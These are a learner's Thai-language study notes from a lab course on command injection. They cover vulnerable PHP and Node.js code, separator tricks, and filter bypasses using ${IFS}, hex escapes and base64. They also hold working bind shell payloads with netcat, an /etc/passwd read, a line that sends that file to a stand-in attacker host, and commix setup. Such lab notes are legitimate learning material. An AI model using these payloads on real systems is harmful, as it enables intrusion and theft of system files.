### <span style="color:rgb(255, 162, 31)">Command Injection</span>
<span style="color:rgb(255, 192, 0)">Description</span>
คือ การใส่ command เพื่อให้ server ทำตามคำสั่ง
Command inject คือ injection attack ซึ่งทำได้หลายจุด เช่น HTTP header , cookie , forms
Examplat PHP code snippet
```php
<?php
if (isset($_GET["target"])) # isset ตรวจสอบว่าเป็นค่าว่างไหม
{
    $target=$_GET["target"]; #เอาค่าที่ได้ใส่ตัวแปร $target 
    exec("/bin/ping -c 3 ".$target,$pingresult, $stats); 
    #exec คือ คำสั่งรันคำสั่งในระบบ (OS command)
    #/binping -c 3 คือ สั่งให้ ping ไปที่ $target 3 ครั้ง
    #$pingresult คือ เก็บผลลัพท์ 
    #$stats คือ เก็บค่า exit code (0 = ping สำเร็จ , ไม่ใช่ 0 = ping ไม่สำเร็จ) 
    foreach($pingresult as $line) #loop แสดงผลลัพธ์ 
    {
        print $line.'<br>';
    }
}
?>
```
ตัวอย่างการ attack 
```bash
http://www.example.com/ping.php?target=127.0.0.1&&cat /etc/passwd
```
สังเกตุว่าจะมีการใส่ &&cat /etc/passwd ไปด้วp

| Separators (Operators) | Description                                                                                                         |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------- |
| ;                      | แยก command แต่ละอันออกจากกัน                                                                                       |
| &                      | รันสั่งคำสั่งหลายๆคำสั่งในทีเดียว โดยรันแบบ backgroud process                                                       |
| &&                     | รันต่อกัน หากคำสั่งแรก(ที่อยู่ด้านหน้า)รันไม่สำเร็จ จะไม่มีการสั่งรันคำสั่งที่ 2                                    |
| \|                     | รันคำสั่งที่ 2 เมื่อคำสั่งด้านหน้าทำงานไม่สำเร็จเท่านั้น หากคำสั่งแรกทำงานสำเร็จจะไม่มีการรันคำสั่งที่ 2            |
| \| ( Linux)            | นำค่าผลลัพธ์ของคำสั่งแรกไปใช้เป็น input ของคำสั่งที่ 2                                                              |
| ‘                      | ตัว unquote character ใช้เพื่อบังคับให้ shell นั้นรัน command แล้วนำส่วนที่อยู่ใน '' ทั้งหมด เป็น input ของ command |
| ()                     | ใช้เพื่ออ้างอิงผลลัพธ์ของ command ทั้งอัน                                                                           |
| #                      | ใช้เพื่อ comment command line                                                                                       |
<span style="color:rgb(255, 192, 0)">Ngrok</span> 
เกี่ยวกับการเชื่อมต่อ ซึ่งผมยังไม่เก็ท เดี๋ยวค่อยมาทวน 

<span style="color:rgb(255, 192, 0)">Reverse Shell vs Bind Shell </span>
- Reverse Shell 
  hacker โจมตีไปที่เครื่องเป้าหมาย แล้วบังคับให้เครื่องเป้าหมายสร้าง connect มาที่เครื่อง hacker
  hacker ต้องสร้าง port ไว้เพื่อรองรับ connect จากเครื่องเป้าหมาย
- Bind Shell
  hacker โจมตี client เพื่อให้ client เปิด port แล้ว hacker ก็เชื่อมต่อเข้าไป
  
### <span style="color:rgb(255, 162, 31)">Reverse Shell</span> 
  hacker โจมตีไปที่เครื่องเป้าหมาย แล้วบังคับให้เครื่องเป้าหมายสร้าง connect มาที่เครื่อง hacker
  hacker ต้องสร้าง port ไว้เพื่อรองรับ connect จากเครื่องเป้าหมาย
  - Attack Example
    ![[Pasted image 20250817154552.png]]
    ![[Pasted image 20250817154453.png]]
    จากภาพเราจะสังเกตุได้ว่า เมื่อเราพิมพ์ command ไป ผลลัพท์จะแสดงให้เห็นใน web อย่างชัดเจน
    นี้แหละคือ Reverse Shell
### <span style="color:rgb(255, 162, 31)">Bind Shell</span>
  hacker โจมตี client เพื่อให้ client เปิด port แล้ว hacker ก็เชื่อมต่อเข้าไป
  - Attack Examp
    1. ตรวจสอบก่อนว่าใช้วิธีการ Bind shell ได้
       ซึ่งขึ้นอยู่กับ server ด้วยว่าใช้วิธีไหนได้ เพราะมันจะมีการปิดกั้นการใช้ command บางcommand เลยต้องลองหาไปเรื่อยๆ
       ![[Pasted image 20250817160026.png]]
       ถ้าพบความ delay ในภาพก็ 5 วิ แสดงว่ามีช่องโหว่นี้
       หรือใช้อีกวิธีคือการดู ping  https://app.interactsh.com/#/
       ![[Pasted image 20250817160437.png]]
       คัดลองลิ้งแล้วไปใส่ในเว็บ
       ![[Pasted image 20250817160716.png]]
       ตามภาพ จะให้มีการ ping 3 ครั้ง จากนั้น submit ดู
       ![[Pasted image 20250817160834.png]]
       พบการ ping มา แสดงว่า Bind shell ได้
    2. Attack
       listener command
       `google.com; nc -lvnp 1234 -e /bin/bash`
       --------------------------------------------
       nc คือ netcat 
       -lvp คือ listen ที่ n
       -e /bin/bash คือ รัน shell ตอน เรา เชื่อมต่อได้
       --------------------------------------------
       ใส่ไปแล้ว submit 
       จากนั่นไปที่ terminal ของเรา
       แล้วพิมพ์ 
       `nc <IP> <PORT>`
       nc 35.240.137.245 1234
       จากนั่นเราให้เราลอง  ls -la เราจะพบว่าเราสามารถเข้ามาได้แล้ว
       ประมาณนี้

### <span style="color:rgb(255, 162, 31)">Command Injection with filter</span>
ต่อมาจากหัวข้อ Command Injection

| Separators (Operators) | Description                                                                                                         |
| ---------------------- | ------------------------------------------------------------------------------------------------------------------- |
| ;                      | แยก command แต่ละอันออกจากกัน                                                                                       |
| &                      | รันสั่งคำสั่งหลายๆคำสั่งในทีเดียว โดยรันแบบ backgroud process                                                       |
| &&                     | รันต่อกัน หากคำสั่งแรก(ที่อยู่ด้านหน้า)รันไม่สำเร็จ จะไม่มีการสั่งรันคำสั่งที่ 2                                    |
| \|                     | รันคำสั่งที่ 2 เมื่อคำสั่งด้านหน้าทำงานไม่สำเร็จเท่านั้น หากคำสั่งแรกทำงานสำเร็จจะไม่มีการรันคำสั่งที่ 2            |
| \| ( Linux)            | นำค่าผลลัพธ์ของคำสั่งแรกไปใช้เป็น input ของคำสั่งที่ 2                                                              |
| ‘                      | ตัว unquote character ใช้เพื่อบังคับให้ shell นั้นรัน command แล้วนำส่วนที่อยู่ใน '' ทั้งหมด เป็น input ของ command |
| ()                     | ใช้เพื่ออ้างอิงผลลัพธ์ของ command ทั้งอัน                                                                           |
| #                      | ใช้เพื่อ comment command line                                                                                       |
เว็บไซต์จะมีการ filter ป้องกันพวก Separators ไว้ 
เราก็ต้องลองไปเรื่อยๆ จนเจออันที่ไม่ได้ป้องกันไว้ ถ้าไม่ได้ก็ต้องหาวิธีการโจมตีอื่น

แนะนำวิธีการจากการทำ lab 
1. เช็ค backup เพื่อดู filter
2. ทำการโจมตีแบบ reverseshell หรือ bind shell ก็ได้ 
   bind shell 
   nc -lvnp 4444 -e /bin/bash
   nc คือ netcat 
   -lvnp 4444 คือ listen port 4444
   -e /bin/bash คือ การรัน shell เมื่อเราเชื่อมต่อสำเร็จ
### <span style="color:rgb(255, 162, 31)">Command Injection without space</span>
ที่นี้มีการ filter space ทำให้เราไม่สามารถเว้นวรรคเพื่อใช้คำสั่งเช่น ls -ls เป็นต้น
1. คือลอง Command Injection ปกติ จะพบว่า error
2. ทำการดู code php จะพบ backlist ที่ว่ามี filter ไรอยู่บ้าง
3. หา payload ที่ไม่ได้อยู่ใน filter 
   ซึ่งในข้อนี้พี่เขาจะแนะนำเป็น
   `google.com&CMD=$'\x20/etc/passwd'&&cat$CMD` หรือ
   `google.com&cat${IFS%?}/etc/passwd` 
   อธิบายโค้ด
   `google.com` -> web ที่เราเอาไว้ทดสอบ ping command 
   `&cat${IFS%?}/etc/passwd` -> payload ซึ่งต้องดูตาม filter ว่าห้ามอะไรก็ต้องประยุกต์ไปเรื่อย
   `x20/etc/passwd'&&cat$CMD` -> payload เหมือนกัน ก็ตามที่บอก มันแล้วแต่ filter ของเว็บนั่นๆ
   `${IFS%?}` → ช่องว่างแบบ bypass filter
   `\x20` → ช่องว่าง ASCII แบบ hex

### <span style="color:rgb(255, 162, 31)">Command Injection without slash(/)</span>
filter แบนการใช้
1. ลอง payload = google.com&ls เพื่อดูว่าต้องโจมตีแบบ Reverse shell หรือ Bind shell
   ซึ่งจากโจทย์ที่เราทำได้แบบ Bind shell
2. ลองดู backup ว่าห้ามไรบ้าง
3. สร้าง playload 
   ซึ่งมันห้าม / จึงต้องใช้วิธีการถอดรหัส
   โดยจาก
   สร้าง payload ทั่วไป : `nc -e /bin/bash -lvp 4444`
   จากนั้น นำไปเข้ารหัส base64 จะได้ `bmMgLWUgL2Jpbi9iYXNoIC1sdnAgNDQ0NA==`
   จากนั้นนำมาใส่ bash command จะได้ 
   `bash -c '{echo,bmMgLWUgL2Jpbi9iYXNoIC1sdnAgNDQ0NA==}|{base64,-d}|{bash,-i}'`
   แต่เนื่องจาก filter ห้ามช่องว่าง " "เลยต้องทำต่อ
   เอาไปทำวิธีการ command injection without space จะได้
   `cmd=$"bash\x20\-c\x20\'{echo,bmMgLWUgL2Jpbi9iYXNoIC1sdnAgNDQ0NA==}|{base64,-d}|{bash,-i}'"&$cmd`
   ประมาณนี้ ที่เลยทำต่อเอง หุหุ
   
### <span style="color:rgb(255, 162, 31)">Command Injection in NodeJS</span>
โจมตี NodeJS กันดีกว่า
ตัวอย่างช่องโหว่
```plaintext
var express = require('express');
var app = express();
app.get('/', function (req, res) {
    res.send('Welcome to SECPlayground - Your security playground<br>Hello, ' + eval(req.query.q));
    console.log(req.query.q);
});
app.listen(80, function () {
    console.log('Run webserver at port 80');
});
```
 ตัวอย่างการโจมตี
 payload
 ```plaintext
require('child_process').exec('cat+/etc/passwd+|+nc+[[ATTACKER]]+4444')
```
จะได้ออกมาเป็น
```plaintext
http://[[TARGET]]/?q=require('child_process').exec('cat+/etc/passwd+|+nc+[[ATTACKER]]+4444')
```


### <span style="color:rgb(255, 162, 31)">Tool Command Injection</span>
ชื่อเครื่องมือ **commix**
วิธีการติดตั้ง
```plaintext
git clone https://github.com/commixproject/commix.git commix
```
การใช้
```plaintext
python commix.py [option(s)]
```
แค่นี้แหละ ที่เหลือ chat gpt help me แล้วกัน หุหุ